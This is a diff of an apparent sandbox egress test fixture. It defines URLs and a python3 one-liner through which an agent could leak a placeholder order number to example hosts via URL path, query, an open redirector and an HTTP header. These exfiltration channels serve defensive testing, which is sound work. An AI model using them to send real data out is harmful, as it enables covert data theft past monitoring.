@@ -27,22 +27,24 @@ export const LEAK_OPEN_ORDER = '#1001'
 const percentAll = (s: string): string => [...s].map(c => `%${c.charCodeAt(0).toString(16).toUpperCase().padStart(2, '0')}`).join('')
 
 /** The redirect's target: the name, fully percent-encoded and then encoded once more, in the query. */
-export const LEAK_OPEN_REDIRECT_TARGET = `https://www.example.org/?order=${encodeURIComponent(percentAll(LEAK_OPEN_ORDER))}`
+export const LEAK_OPEN_REDIRECT_TARGET = `https://example.org/?order=${encodeURIComponent(percentAll(LEAK_OPEN_ORDER))}`
 
 /**
  * The URLs the agent fetches, each on a host of its own so the egress record (host only) ties each row to one attempt.
- * `redirect` is a public redirector (httpbin's `redirect-to` answers 302 with its `url` parameter, decoded once, as the
- * Location), so the sandbox run needs httpbin.org reachable; the twin answers that hop itself.
+ * `redirect` is a public redirector: go-httpbin's `redirect-to` answers 302 with its `url` parameter, decoded once, as
+ * the Location, but only to example.com, example.net, example.org or itself (httpbin.org refuses every other target with
+ * a 403 too; sandbox run 46107566042), so the target is example.org and the path and query attempts use the `www.`
+ * names. The sandbox run needs httpbingo.org reachable; the twin answers that hop itself.
  */
 export const LEAK_OPEN_URLS = {
   control: 'https://example.com/?ref=m3j-open-control',
-  path: `https://example.org/orders/${encodeURIComponent(LEAK_OPEN_ORDER)}`,
-  query: `https://example.net/?order=${encodeURIComponent(LEAK_OPEN_ORDER)}`,
-  redirect: `https://httpbin.org/redirect-to?url=${encodeURIComponent(LEAK_OPEN_REDIRECT_TARGET)}`,
+  path: `https://www.example.org/orders/${encodeURIComponent(LEAK_OPEN_ORDER)}`,
+  query: `https://www.example.net/?order=${encodeURIComponent(LEAK_OPEN_ORDER)}`,
+  redirect: `https://httpbingo.org/redirect-to?url=${encodeURIComponent(LEAK_OPEN_REDIRECT_TARGET)}`,
 } as const
 
 /** The host the header attempt aims at: nothing may reach it, so the egress record never names it. */
-export const LEAK_OPEN_HEADER_HOST = 'www.example.net'
+export const LEAK_OPEN_HEADER_HOST = 'www.example.com'
 export const LEAK_OPEN_HEADER_COMMAND =
   `python3 -c "import urllib.request as u; print(u.urlopen(u.Request('https://${LEAK_OPEN_HEADER_HOST}/headers', headers={'X-Order': '${LEAK_OPEN_ORDER}'}), timeout=10).read()[:200])"`
 
